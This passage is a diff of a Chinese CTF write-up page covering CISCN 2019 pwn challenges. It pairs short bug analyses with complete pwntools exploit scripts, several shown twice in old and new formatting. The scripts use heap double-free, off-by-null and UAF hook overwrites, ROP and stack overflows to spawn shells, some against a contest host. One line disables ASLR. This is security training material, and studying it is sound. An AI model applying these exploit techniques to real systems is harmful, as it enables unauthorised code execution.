class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        Add(<span class="number">0x80</span>, <span class="string">"A"</span>*<span class="number">60</span>)</span><br><span class="line">    Del(<span class="number">0</span>)</span><br><span class="line">    Del(<span class="number">1</span>)</span><br><span class="line">    Del(<span class="number">0</span>)</span><br><span class="line">    Show(<span class="number">1</span>)</span><br><span class="line">    leak1 = io.readline().strip().ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    heap = u64(leak1) - <span class="number">0x11e70</span></span><br><span class="line">    success(<span class="string">"heap: 0x%x"</span>%heap)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">6</span>):</span><br><span class="line">        Del(i)</span><br><span class="line">    Del(<span class="number">6</span>)</span><br><span class="line">    Del(<span class="number">7</span>)</span><br><span class="line">    Show(<span class="number">6</span>)</span><br><span class="line">    leak2 = io.readline().strip().ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    libbase = u64(leak2) - <span class="number">0x3ebca0</span></span><br><span class="line">    success(<span class="string">"libbase: 0x%x"</span>%libbase)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        Add(<span class="number">0x80</span>, <span class="string">"A"</span>*<span class="number">60</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># gdb.attach(io, "b *0x&#123;:x&#125;".format(base+0x16E9))</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    payload = libbase + libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line">    Add(<span class="number">0x80</span>, p64(payload))</span><br><span class="line">    Add(<span class="number">0x80</span>, <span class="string">"A"</span>*<span class="number">60</span>)</span><br><span class="line">    Add(<span class="number">0x80</span>, <span class="string">"A"</span>*<span class="number">60</span>)</span><br><span class="line">    </span><br><span class="line">    system = libbase + libc.sym[<span class="string">"system"</span>]</span><br><span class="line">    Add(<span class="number">0x80</span>, p64(system))</span><br><span class="line">    Add(<span class="number">0x80</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    Del(<span class="number">16</span>)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/python
+from pwn import *
+io = remote(&#39;10.50.1.2&#39;,10004)
+# io = process(&quot;./babyHeap&quot;, aslr=False)
+# libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+libc = ELF(&quot;./libc.so.6&quot;)
+base = io.libs()[&quot;/home/fun/Desktop/pwn/offline_learn/babyHeap&quot;]
 
+def pass_name(name):
+    io.sendlineafter(&quot;input name\n&quot;, name)
+
+def Add(sz, content):
+    io.sendlineafter(&quot;&gt; \n&quot;, &quot;1&quot;)
+    io.sendlineafter(&quot;input the size \n&quot;, str(sz))
+    io.sendafter(&quot;something...\n&quot;, content)
+
+def Del(idx):
+    io.sendlineafter(&quot;&gt; \n&quot;, &quot;2&quot;)
+    io.sendlineafter(&quot;input the index\n&quot;, str(idx))
+
+def Show(idx):
+    io.sendlineafter(&quot;&gt; \n&quot;, &quot;3&quot;)
+    io.sendlineafter(&quot;input the index\n&quot;, str(idx))
+
+if __name__ == &quot;__main__&quot;:
+    pass_name(&quot;NEUQRO&quot;)
+    for i in range(8):
+        Add(0x80, &quot;A&quot;*60)
+    Del(0)
+    Del(1)
+    Del(0)
+    Show(1)
+    leak1 = io.readline().strip().ljust(8,&#39;\x00&#39;)
+    heap = u64(leak1) - 0x11e70
+    success(&quot;heap: 0x%x&quot;%heap)
+    for i in range(2, 6):
+        Del(i)
+    Del(6)
+    Del(7)
+    Show(6)
+    leak2 = io.readline().strip().ljust(8,&#39;\x00&#39;)
+    libbase = u64(leak2) - 0x3ebca0
+    success(&quot;libbase: 0x%x&quot;%libbase)
+
+
+    for i in range(4):
+        Add(0x80, &quot;A&quot;*60)
+
+    # gdb.attach(io, &quot;b *0x{:x}&quot;.format(base+0x16E9))
+    # pause()
+    payload = libbase + libc.sym[&quot;__free_hook&quot;]
+    Add(0x80, p64(payload))
+    Add(0x80, &quot;A&quot;*60)
+    Add(0x80, &quot;A&quot;*60)
+
+    system = libbase + libc.sym[&quot;system&quot;]
+    Add(0x80, p64(system))
+    Add(0x80, &quot;/bin/sh\x00&quot;)
+    Del(16)
+    io.interactive()</code></pre>
 <h2 id="pwn3（比赛中未做出）"><a href="#pwn3（比赛中未做出）" class="headerlink" title="pwn3（比赛中未做出）"></a>pwn3（比赛中未做出）</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>输入<code>-1</code>可以造成溢出。</p>
 <p>关闭<code>aslr</code>调试：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sh -c <span class="string">"echo 0 &gt; /proc/sys/kernel/randomize_va_space"</span></span><br></pre></td></tr></table></figure>
-
+<pre><code class="bash">sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</code></pre>
 <p>虽然没做上，但我还是要写一下，这个确实差一点很可惜，因为看不了<code>F5</code>的代码所以当时有点着急了，其实<code>strtol</code>的函数中的<code>buf</code>是写在<code>bss</code>上的。可以输入<code>-1\x00.....</code>中间加入我们的<code>payload</code>把这个伪造成栈。</p>
 <p>退栈的时候使用<code>ecx</code>来恢复栈，第一次通过对最低字节写入，使其泄露<code>libc</code>地址并回到<code>main</code>，第二次的时候把栈直接劫持到<code>bss</code>的<code>buf</code>那里来直接执行<code>system(&quot;/bin/sh&quot;)</code>即可。</p>
 <p>第一次的泄露不一定成功，需要多试几次。</p>
 <p>这个<code>exp</code>我也懒得跑了，不保证写的一定对，毕竟没做上-.-。</p>
-<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span> , os = <span class="string">'linux'</span>, log_level=<span class="string">"debug"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>   : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> x : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x : p.recv(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b : p.sendafter(a,b) </span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : p.sendlineafter(a, b)</span><br><span class="line">slog = <span class="keyword">lambda</span> x : log.success(x)</span><br><span class="line">flog = <span class="keyword">lambda</span> x : log.success(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./pwn')</span></span><br><span class="line"><span class="comment">#libc = ELF('./libc')</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"10.50.1.2"</span>, <span class="number">10000</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd)</span>:</span></span><br><span class="line">	gdb.attach(p, cmd)</span><br><span class="line">	<span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#cmd = "b *0x8048795\n"</span></span><br><span class="line">cmd = <span class="string">"b *0x80487b3"</span></span><br><span class="line"><span class="comment">#debug(cmd)</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">':'</span>)</span><br><span class="line">p.send(<span class="string">"a"</span>)</span><br><span class="line">ru(<span class="string">'password: '</span>)</span><br><span class="line">p.send(str(<span class="number">-1</span>))</span><br><span class="line">ru(<span class="string">':'</span>)</span><br><span class="line"></span><br><span class="line">pop_ebx = <span class="number">0x8048431</span></span><br><span class="line">payload = (p32(elf.plt[<span class="string">'puts'</span>]) +p32(pop_ebx) +p32(elf.got[<span class="string">'__libc_start_main'</span>])+p32(<span class="number">0x80486ea</span>)) * <span class="number">4</span></span><br><span class="line">payload += p32(<span class="number">0x80484f0</span>) *<span class="number">2</span></span><br><span class="line">payload += <span class="string">"\x18"</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'contiune\n'</span>)</span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>))-libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"><span class="comment">#p.send("12678")</span></span><br><span class="line">ru(<span class="string">':'</span>)</span><br><span class="line">p.send(<span class="string">"a"</span>)</span><br><span class="line">ru(<span class="string">'password: '</span>)</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh = libc_base + next(libc.search(<span class="string">'/bin/sh\x00'</span>))</span><br><span class="line">payload2 = <span class="string">"-1\x00"</span> + p32(system) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line">p.send(str(<span class="number">-1</span>))</span><br><span class="line">ru(<span class="string">':'</span>)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">"a"</span>*<span class="number">0x48</span></span><br><span class="line">payload3 += p32(<span class="number">0x804a060</span>+<span class="number">4</span>+<span class="number">3</span>)</span><br><span class="line"><span class="comment">#ru(":")</span></span><br><span class="line">p.send(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+context(arch = &#39;i386&#39; , os = &#39;linux&#39;, log_level=&quot;debug&quot;)
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
 
+ru = lambda x : p.recvuntil(x)
+sn = lambda x : p.send(x)
+rl = lambda   : p.recvline()
+sl = lambda x : p.sendline(x)
+rv = lambda x : p.recv(x)
+sa = lambda a,b : p.sendafter(a,b) 
+sla = lambda a,b : p.sendlineafter(a, b)
+slog = lambda x : log.success(x)
+flog = lambda x : log.success(x)
+
+
+#p = process(&#39;./pwn&#39;)
+#libc = ELF(&#39;./libc&#39;)
+
+p = remote(&quot;10.50.1.2&quot;, 10000)
+libc = ELF(&#39;./libc.so.6&#39;)
+
+elf = ELF(&#39;./pwn&#39;)
+
+
+def debug(cmd):
+    gdb.attach(p, cmd)
+    #pause()
+
+#cmd = &quot;b *0x8048795\n&quot;
+cmd = &quot;b *0x80487b3&quot;
+#debug(cmd)
+
+ru(&#39;:&#39;)
+p.send(&quot;a&quot;)
+ru(&#39;password: &#39;)
+p.send(str(-1))
+ru(&#39;:&#39;)
+
+pop_ebx = 0x8048431
+payload = (p32(elf.plt[&#39;puts&#39;]) +p32(pop_ebx) +p32(elf.got[&#39;__libc_start_main&#39;])+p32(0x80486ea)) * 4
+payload += p32(0x80484f0) *2
+payload += &quot;\x18&quot;
+p.send(payload)
+
+ru(&#39;contiune\n&#39;)
+libc_base = u32(p.recv(4))-libc.symbols[&#39;__libc_start_main&#39;]
+print hex(libc_base)
+#p.send(&quot;12678&quot;)
+ru(&#39;:&#39;)
+p.send(&quot;a&quot;)
+ru(&#39;password: &#39;)
+system = libc_base + libc.symbols[&#39;system&#39;]
+bin_sh = libc_base + next(libc.search(&#39;/bin/sh\x00&#39;))
+payload2 = &quot;-1\x00&quot; + p32(system) + p32(0) + p32(bin_sh)
+p.send(str(-1))
+ru(&#39;:&#39;)
+
+payload3 = &quot;a&quot;*0x48
+payload3 += p32(0x804a060+4+3)
+#ru(&quot;:&quot;)
+p.send(payload3)
+p.interactive()
+</code></pre>
 <h2 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>通过<code>Get</code>函数的堆末尾指针泄露得知不是<code>2.27</code>，所以就推测<code>2.23</code>一把梭哈。</p>
 <p><code>Play</code>函数里面当新<code>size</code>和原来的<code>size</code>差10的时候，会造成<code>size+1</code></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_E3C</span><span class="params">(<span class="keyword">signed</span> <span class="keyword">int</span> old_size, <span class="keyword">unsigned</span> <span class="keyword">int</span> new_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( old_size &gt; (<span class="keyword">signed</span> <span class="keyword">int</span>)new_size )</span><br><span class="line">    <span class="keyword">return</span> new_size;</span><br><span class="line">  <span class="keyword">if</span> ( new_size - old_size == <span class="number">10</span> )</span><br><span class="line">    LODWORD(result) = old_size + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    LODWORD(result) = old_size;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="C">__int64 __fastcall sub_E3C(signed int old_size, unsigned int new_size)
+{
+  __int64 result; // rax
 
+  if ( old_size &gt; (signed int)new_size )
+    return new_size;
+  if ( new_size - old_size == 10 )
+    LODWORD(result) = old_size + 1;
+  else
+    LODWORD(result) = old_size;
+  return (unsigned int)result;
+}</code></pre>
 <p>所以用<code>off-by-null</code>来造成泄露，同时触发<code>UAF</code>写<code>__malloc_hook</code>，然后<code>double free</code>触发即可</p>
-<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span> , os = <span class="string">'linux'</span>, log_level=<span class="string">"debug"</span>)</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>   : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> x : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x : p.recv(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b : p.sendafter(a,b) </span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : p.sendlineafter(a, b)</span><br><span class="line">slog = <span class="keyword">lambda</span> x : log.success(x)</span><br><span class="line">flog = <span class="keyword">lambda</span> x : log.success(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="comment">#p = process('./childpwn')</span></span><br><span class="line">proc_base = p.libs()[p._cwd+p.argv[<span class="number">0</span>].strip(<span class="string">'.'</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote("10.50.1.2", 10010)</span></span><br><span class="line">libc = ELF(<span class="string">"./libc"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd)</span>:</span></span><br><span class="line">	gdb.attach(p, cmd)</span><br><span class="line">	<span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(choice)</span>:</span></span><br><span class="line">    sla(<span class="string">'CHOICE: '</span>,str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_t</span><span class="params">(size)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">'size: '</span>,str(size)) </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">play</span><span class="params">(index,size,con)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">'index: '</span>,str(index))</span><br><span class="line">    sla(<span class="string">"size: "</span>,str(size))</span><br><span class="line">    sa(<span class="string">"content: "</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">game_over</span><span class="params">(index)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">'index: '</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">look</span><span class="params">(index)</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">'index: '</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#cmd = "set $a=%d\n" %(proc_base+0x202040)</span></span><br><span class="line"><span class="comment">#cmd += "set $b=%d" %(proc_base+0x202048)</span></span><br><span class="line"><span class="comment">#debug(cmd)</span></span><br><span class="line"></span><br><span class="line">get_t(<span class="number">0xc8</span>)  <span class="comment"># 0</span></span><br><span class="line">get_t(<span class="number">0xc8</span>)  <span class="comment"># 1</span></span><br><span class="line">get_t(<span class="number">0x68</span>)  <span class="comment"># 2</span></span><br><span class="line">get_t(<span class="number">0xf8</span>)  <span class="comment"># 3</span></span><br><span class="line">get_t(<span class="number">0x18</span>)  <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">game_over(<span class="number">0</span>)</span><br><span class="line">play(<span class="number">2</span>,<span class="number">0x68</span>+<span class="number">10</span>,<span class="string">"a"</span>*<span class="number">0x60</span>+p64(<span class="number">0x210</span>)+<span class="string">"\x00"</span>)</span><br><span class="line">game_over(<span class="number">3</span>)</span><br><span class="line">get_t(<span class="number">0xc8</span>)  <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">look(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">'content: '</span>)</span><br><span class="line">leak = u64(ru(<span class="string">'\x7f'</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = leak - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">get_t(<span class="number">0xc8</span>)  <span class="comment"># 3</span></span><br><span class="line">get_t(<span class="number">0x68</span>)  <span class="comment"># 5</span></span><br><span class="line">game_over(<span class="number">2</span>)</span><br><span class="line">payload = (p64(libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))*<span class="number">2</span></span><br><span class="line">play(<span class="number">5</span>, <span class="number">0x10</span>, payload)</span><br><span class="line"></span><br><span class="line">get_t(<span class="number">0x68</span>)</span><br><span class="line">get_t(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">play(<span class="number">6</span>, <span class="number">0x1b</span>, <span class="string">"a"</span>*<span class="number">0x13</span>+p64(libc_base+one[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">game_over(<span class="number">1</span>)</span><br><span class="line">game_over(<span class="number">3</span>)</span><br><span class="line">p .interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+context(arch = &#39;amd64&#39; , os = &#39;linux&#39;, log_level=&quot;debug&quot;)
+#context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
 
+ru = lambda x : p.recvuntil(x)
+sn = lambda x : p.send(x)
+rl = lambda   : p.recvline()
+sl = lambda x : p.sendline(x)
+rv = lambda x : p.recv(x)
+sa = lambda a,b : p.sendafter(a,b) 
+sla = lambda a,b : p.sendlineafter(a, b)
+slog = lambda x : log.success(x)
+flog = lambda x : log.success(x)
+
+
+p = process(&#39;./pwn&#39;)
+#p = process(&#39;./childpwn&#39;)
+proc_base = p.libs()[p._cwd+p.argv[0].strip(&#39;.&#39;)]
+
+#p = remote(&quot;10.50.1.2&quot;, 10010)
+libc = ELF(&quot;./libc&quot;)
+
+def debug(cmd):
+    gdb.attach(p, cmd)
+    #pause()
+
+def choice(choice):
+    sla(&#39;CHOICE: &#39;,str(choice))
+
+def get_t(size):
+    choice(1)
+    sla(&#39;size: &#39;,str(size)) 
+
+def play(index,size,con):
+    choice(2)
+    sla(&#39;index: &#39;,str(index))
+    sla(&quot;size: &quot;,str(size))
+    sa(&quot;content: &quot;,con)
+
+def game_over(index):
+    choice(3)
+    sla(&#39;index: &#39;,str(index))
+
+def look(index):
+    choice(4)
+    sla(&#39;index: &#39;,str(index))
+
+#cmd = &quot;set $a=%d\n&quot; %(proc_base+0x202040)
+#cmd += &quot;set $b=%d&quot; %(proc_base+0x202048)
+#debug(cmd)
+
+get_t(0xc8)  # 0
+get_t(0xc8)  # 1
+get_t(0x68)  # 2
+get_t(0xf8)  # 3
+get_t(0x18)  # 4
+
+game_over(0)
+play(2,0x68+10,&quot;a&quot;*0x60+p64(0x210)+&quot;\x00&quot;)
+game_over(3)
+get_t(0xc8)  # 0
+
+look(1)
+ru(&#39;content: &#39;)
+leak = u64(ru(&#39;\x7f&#39;).ljust(8, &quot;\x00&quot;))
+libc_base = leak - 0x3c4b78
+print hex(libc_base)
+
+get_t(0xc8)  # 3
+get_t(0x68)  # 5
+game_over(2)
+payload = (p64(libc_base+libc.symbols[&#39;__malloc_hook&#39;]-0x23))*2
+play(5, 0x10, payload)
+
+get_t(0x68)
+get_t(0x68)
+
+one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
+
+play(6, 0x1b, &quot;a&quot;*0x13+p64(libc_base+one[2]))
+
+game_over(1)
+game_over(3)
+p .interactive()
+</code></pre>
 <h2 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>栈溢出题目：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] &apos;/home/fun/Desktop/ctf/CISCN2019/pwn/pwn&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
-
-<p>首先，用户名直接用strcmp比较administrator。</p>
+<pre><code>[*] &#39;/home/fun/Desktop/ctf/CISCN2019/pwn/pwn&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)</code></pre><p>首先，用户名直接用strcmp比较administrator。</p>
 <p>在<code>080488E7</code>处调用的函数，其中：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl AddLog(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;Please input new log info:&quot;);</span><br><span class="line">  return __isoc99_scanf(&quot;%128s&quot;, a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这其实和<code>printf</code>的<code>format string vlunerable</code>一个道理，会写到栈上第一个参数指向的内存，起gdb调试：</p>
+<pre><code>int __cdecl AddLog(int a1)
+{
+  printf(&quot;Please input new log info:&quot;);
+  return __isoc99_scanf(&quot;%128s&quot;, a1);
+}</code></pre><p>这其实和<code>printf</code>的<code>format string vlunerable</code>一个道理，会写到栈上第一个参数指向的内存，起gdb调试：</p>
 <p><img src="/CISCN2019-%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA%E7%BA%BF%E4%B8%8B%E8%B5%9B-pwn/Snipaste_2019-06-23_09-55-10.png" alt="Snipaste_2019-06-23_09-55-10"></p>
 <p>在这个图中会写到<code>0xfffa190c</code>上。</p>
 <p>另外，在<code>0x080486C7</code>的函数上，使用了<code>strcpy</code>，把一个最大长度为128的字符串放到缓冲区为72的地方，存在栈溢出。</p>
@@ -239,755 +786,369 @@
 <p>这里有一个问题就是<code>&quot;/bin/sh&quot;</code>字符串不太好找，但可以从程序凑出来。</p>
 <p>在<code>gdb</code>中使用search命令可以找到<code>&quot;sh\x00&quot;</code>，其实是<code>0x080482E6</code>地址处的<code>fflush\x00</code>截开。</p>
 <p>很简单的<code>payload</code>：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'A'</span>*<span class="number">76</span> + p32(<span class="number">0x080484d0</span>) + <span class="string">'BBBB'</span> + p32(<span class="number">0x80482ea</span>)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">payload = &#39;A&#39;*76 + p32(0x080484d0) + &#39;BBBB&#39; + p32(0x80482ea)</code></pre>
+<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+context.terminal = [&#39;terminator&#39;, &#39;-x&#39;, &#39;sh&#39;, &#39;-c&#39;]
 
-<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line">io= process(<span class="string">"./pwn"</span>)</span><br><span class="line"><span class="comment"># io = remote("10.50.1.2", 10008)</span></span><br><span class="line">gdb.attach(io, <span class="string">"b *0x080486C7"</span>)</span><br><span class="line">io.sendlineafter(<span class="string">"password:"</span>, <span class="string">"administrator"</span>)</span><br><span class="line">io.sendlineafter(<span class="string">":"</span>, <span class="string">"1"</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">76</span> + p32(<span class="number">0x080484d0</span>) + <span class="string">'BBBB'</span> + p32(<span class="number">0x80482ea</span>)</span><br><span class="line">io.sendlineafter(<span class="string">"info:"</span>, payload)</span><br><span class="line">io.sendlineafter(<span class="string">":"</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+io= process(&quot;./pwn&quot;)
+# io = remote(&quot;10.50.1.2&quot;, 10008)
+gdb.attach(io, &quot;b *0x080486C7&quot;)
+io.sendlineafter(&quot;password:&quot;, &quot;administrator&quot;)
+io.sendlineafter(&quot;:&quot;, &quot;1&quot;)
+payload = &#39;A&#39;*76 + p32(0x080484d0) + &#39;BBBB&#39; + p32(0x80482ea)
+io.sendlineafter(&quot;info:&quot;, payload)
+io.sendlineafter(&quot;:&quot;, &quot;4&quot;)
 
+io.interactive()</code></pre>
 <h2 id="pwn6"><a href="#pwn6" class="headerlink" title="pwn6"></a>pwn6</h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p><code>Delete</code>的时候出现了问题，判断<code>ptr</code>是否存在，但是没有判断是不是在全局数组里面。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_12B8</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"index:"</span>);</span><br><span class="line">  idx = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr = *(<span class="keyword">void</span> **)(<span class="number">16L</span>L * idx + chunk_bss_ptr + <span class="number">8</span>);</span><br><span class="line">    *(_QWORD *)(<span class="number">16L</span>L * idx + chunk_bss_ptr) = <span class="number">0L</span>L;</span><br><span class="line">    *(_QWORD *)(<span class="number">16L</span>L * idx + chunk_bss_ptr + <span class="number">8</span>) = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="C">unsigned __int64 sub_12B8()
+{
+  signed int idx; // [rsp+Ch] [rbp-14h]
+  void *ptr; // [rsp+10h] [rbp-10h]
+  unsigned __int64 v3; // [rsp+18h] [rbp-8h]
 
+  v3 = __readfsqword(0x28u);
+  printf(&quot;index:&quot;);
+  idx = read_int();
+  if ( idx &gt;= 0 &amp;&amp; idx &lt;= 9 )
+  {
+    ptr = *(void **)(16LL * idx + chunk_bss_ptr + 8);
+    *(_QWORD *)(16LL * idx + chunk_bss_ptr) = 0LL;
+    *(_QWORD *)(16LL * idx + chunk_bss_ptr + 8) = 0LL;
+  }
+  if ( ptr )
+    free(ptr);
+  return __readfsqword(0x28u) ^ v3;
+}</code></pre>
